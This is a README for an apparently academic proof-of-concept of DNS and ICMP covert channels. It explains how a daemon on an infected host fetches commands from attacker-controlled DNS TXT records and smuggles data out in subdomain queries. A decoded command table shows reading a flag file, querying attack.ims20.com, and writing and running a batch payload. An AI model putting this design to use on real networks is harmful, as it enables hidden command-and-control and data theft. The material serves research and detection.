# Covert Channels - A proof of concept
Covert channels serve as a way to transport data out of a network or inside a network. All of this happens in a hidden manner. So the real trick with covert channels is to hide the communication between two parties behind some kind of cover. This repository contains a proof of concept for storage based covert channels using DNS and ICMP.
## Foreword
All code and configuration contained in this repository was developed by Simon Schönegger and Lejla Sarcevic during research regarding covert channels. This code is not intended for malicious use - it should serve as an example on how covert channels can be established and how they may be uncovered.

## DNS Covert Channel
Code and configration for a DNS Covert channel can be found under the DNS folder in this repository.
### Infrastructure
This covert channels is used post exploitation. This means we require an infected client that runns our script. We wrote this script using python but requiring a python interpreter on the victim is not the way to go - it should be written in a language that can access the filesystem as well as the network and is native to the operating system - something like C.


The second requirement is a DNS server under our control. This 'evil' DNS server needs to be listed on a legit DNS server so that it can be queried without setting the default DNS server on the victim machine. For our proof of concept we used a ubuntu server 18.04. It runs bind9 as a dns server.

### Daemon
Our deamon script is run on the infected machine. It performs queries against our DNS server.
 The important part here is that the DNS server returns TXT records on specific subdomains. 
 These TXT records are used to store the commands we want to execute on the infected machine. 
 Further information about the records can be found in the configuration section. 
 
 
 The basic intention of the script is to simply interpret the commands it receives from the DNS server.
 If it is instructed to exfiltrate data it performs a DNS query and uses the encrypted data as sub domain.
 This way the exfiltrated data can be found in the query log of the server. The server could also run a script
 which analyzes the received DNS queries for exfiltrated data.
 
 It may also create files on the infected system as well as add content to these files. It is capable of executing
 the files. In this way payload can be brought to the infected system (later described under configuration).
 
 One drawback of our published daemon script is that it only interprets data once. It should be hooked in a way that
 it always waits for commands added on the server. This can be done without much effort but we did not bother to 
 include it in this small proof of concept.
 
 Commands are Base64 encoded, exfiltrated data is encoded using Base32.
 
 ### Configuration
 I will not go into too much detail about the configuration of bind9 since this can be easily googled and is not
 in scope of this work.
 
 
 The interesting part for are the zone files. It contains the records that the DNS server will return for speficic
 queries. The configuration files themselves can be found in the DNS section of this repository. I would recommend reading
 them before you continue to read here.
 

As seen in the configuration files it contains Base64 encoded data TXT sections. This data is the actual payload that 
the daemon can interpret. I will decode the commands and describe the actions of the daemon for a better understanding

|Record | Decoded | Action of the daemon |
|-------|---------|----------------------|
|e3JlYWQgQzpcVXNlcnNcUHVibGljXERvY3VtZW50c1xmbGFnLnR4dH17YXNrIGF0dGFjay5pbXMyMC5jb219|{read C:\Users\Public\Documents\flag.txt}{ask attack.ims20.com}| read contents of flag.txt and query attack.ims20.com for instructions|
|e2NyZWF0ZSBDOlxVc2Vyc1xQdWJsaWNcRG9jdW1lbnRzXGV4cGxvaXQuYmF0ICBDOlxXaW5kb3dzXHN5c3RlbTMyXGNhbGMuZXhlfXthc2sgcnVubmVyLmltczIwLmNvbX0=|{create C:\Users\Public\Documents\exploit.bat  C:\Windows\system32\calc.exe}{ask runner.ims20.com}| Create exploit.bat, write the payload to it and ask runner.ims20.com for instructions|
|e3J1biBDOlxVc2Vyc1xQdWJsaWNcRG9jdW1lbnRzXGV4cGxvaXQuYmF0fQ==|{run C:\Users\Public\Documents\exploit.bat}| Execute exploit.bat (launches a calculator)|
 
 
It is crucial to configure query logging on the server. I won't go into too much detail on how to do that, however i will
share my apparmor configuration.


## ICMP Covert Channel
Code for this covert channel can be found in the ICMP folder in this repository. All commands used in the ICMP data 
section are set behind *{}* which are not encrypted so our scripts can simply find the commands.
### Infrastructure
Once again, we require a infected machine. Our daemon will be run on that machine. We also require a commander that is able
to send icmp packages to the infected machine. If this is not directly possible, we can also implement a chain of commands
to tranfer data over multiple machines to the outside. Our script could be extended in that manner. The daemon would be 
required to run on all of the chained machines and would need to forward to the correct IP addresses.

### Commander
In our case the commander only sends a limited number of commands to the daemon. The commander only sends 
*{e3JlYWQgfi9mbGFnLnR4dH0=}* which translates to *{{read ~/flag.txt}}*. The commander has to be able to 
listen for incoming pings aswell since the daemon will reach out to it once the command is run. The commander
specifies a different command set than the daemon. In that way the echo replies of the daemon will not be 
interpreted and cause no loop.

The commander sends it commands Base64 encoded.


Listener and commander are run in different Threads.

### Daemon
The daemon waits for incoming ICMP packages. Once it receives one, it seaches for the commands. It interprets the 
command accordingly and sends back a ICMP package to the commander. The daemon encodes its payload with Base32 in contrast
to the Commander which always encodes commands in Base64.

# Contact
Simon Schönegger 
* [LinkedIn](https://www.linkedin.com/in/simon-sch%C3%B6negger-b4b663165/)
* Mail: simon.schoenegger@edu.fh-joanneum.at

Lejla Sarcevic
* Mail: lejla.sarcevic@edu.fh-joanneum.at
